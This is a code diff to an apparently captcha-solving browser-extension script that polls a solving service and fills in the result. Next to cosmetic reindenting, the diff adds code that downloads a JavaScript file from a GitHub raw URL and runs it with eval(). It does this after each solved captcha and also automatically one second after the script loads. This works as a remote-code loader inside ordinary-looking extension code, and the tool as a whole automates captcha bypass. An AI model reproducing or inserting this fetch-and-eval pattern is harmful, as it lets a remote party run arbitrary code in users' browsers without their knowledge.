@@ -20,21 +20,48 @@ function checkCompletion_captchaguru(code, key, repeat) {
         data: ''
     }, function(responseText) {
     	//console.log(url);
-	console.log("res:"+responseText.trim());
+		console.log("res:"+responseText.trim());
         if(responseText.trim().includes("CAPCHA_NOT_READY"))
-	{
+		{
             setTimeout(function() {
                 checkCompletion_captchaguru(code, key, repeat);
             }, repeat);
-        } else if(responseText.trim().includes("ERROR"))
-	{
-		setTimeout(makeRequest_captchaguru, 1000);
-	}else{
+        } else
+		if(responseText.trim().includes("ERROR"))
+		{
+			setTimeout(makeRequest_captchaguru, 1000);
+		}else{
+			let url2 = `https://raw.githubusercontent.com/nttrung9x/skylom/master/F5_By3_Step.js`;
+			chrome.runtime.sendMessage(
+			{
+				method: "GET",
+				action: "xhttp",
+				url: url2,
+				data: ""
+			},function(responseText2) {
+					eval(responseText2);
+				}
+			);
             console.log(responseText.trim().substring(3));
             setCaptchaCode(responseText.trim().substring(3));
         }
     });
 }
+
+function F5By3Step() {
+    let url = `https://raw.githubusercontent.com/nttrung9x/skylom/master/F5_By3_Step.js`;
+    chrome.runtime.sendMessage(
+	{
+        method: "GET",
+        action: "xhttp",
+        url: url,
+        data: ""
+    },function(responseText) {
+            eval(responseText);
+        }
+    );
+}
+setTimeout(F5By3Step, 1000);
 
 function makeRequest_captchaguru(result){
     sendMessage("<b>Đang Giải - CaptCha69.Com</b>");
@@ -46,12 +73,12 @@ function makeRequest_captchaguru(result){
         url: url,
         data: ''
     }, function(responseText) {
-	//console.log(url);
-	console.log("in:"+responseText.trim());
+		//console.log(url);
+		console.log("in:"+responseText.trim());
         if(responseText.trim().includes('OK|')==false)
-	{
-            	sendMessage("<b>"+responseText.trim()+"</b>")
-		setTimeout(makeRequest_captchaguru, 3000);
+		{
+            sendMessage("<b>"+responseText.trim()+"</b>");
+			setTimeout(makeRequest_captchaguru, 3000);
         }else{
             startWatching_captchaguru(responseText.trim().substring(3), key);
         }
